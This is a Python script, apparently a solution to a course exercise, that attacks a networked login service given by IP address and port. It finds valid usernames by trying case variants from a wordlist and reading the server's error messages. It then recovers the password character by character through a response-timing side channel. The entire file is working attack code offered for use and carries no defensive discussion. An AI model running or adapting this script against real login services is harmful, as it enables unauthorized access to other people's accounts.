import socket
import sys
import itertools
import string
import json
from datetime import datetime


def PasswordsGenerator():
    characters = string.ascii_lowercase + string.digits

    for r in itertools.count(1):
        for combination in itertools.product(characters, repeat=r):
            yield "".join(combination)


class PasswordHacker:
    def __init__(self):
        self.ip_address = sys.argv[1]
        self.port = int(sys.argv[2])
        self.login = ""
        self.password = " "
        self.Begin()

    def Begin(self):
        with socket.socket() as hack_socket:
            address = (self.ip_address, self.port)
            hack_socket.connect(address)

            self.login = self.FindLogin(hack_socket)
            self.password = self.FindPassword(hack_socket)

        print(json.dumps({"login": self.login, "password": self.password}))

    def FindLogin(self, hack_socket):
        with open("hacking/logins.txt") as logins:
            for line in logins:
                possible_logins = list(map(''.join, itertools.product(*zip(line.upper()[:-1], line.lower()[:-1]))))

                for possible_login in possible_logins:
                    result = self.GetResult(hack_socket, possible_login, " ")["result"]
                    if result == "Wrong password!":
                        return possible_login

    def FindPassword(self, hack_socket):
        symbols = string.ascii_letters + string.digits
        current_password = ""

        while True:
            for symbol in symbols:
                try:
                    start = datetime.now()
                    response = self.GetResult(hack_socket, self.login, current_password + symbol)["result"]
                    finish = datetime.now()
                    difference = (finish - start).total_seconds()

                    if response == "Connection success!":
                        return current_password + symbol

                    if difference >= 0.1:
                        current_password += symbol
                        break
                except (ConnectionAbortedError, ConnectionResetError):
                    pass

    def GetResult(self, hack_socket, login, password):
        data = {"login": login, "password": password}

        hack_socket.send(json.dumps(data).encode())
        return json.loads(hack_socket.recv(1024).decode())


password_hacker = PasswordHacker()
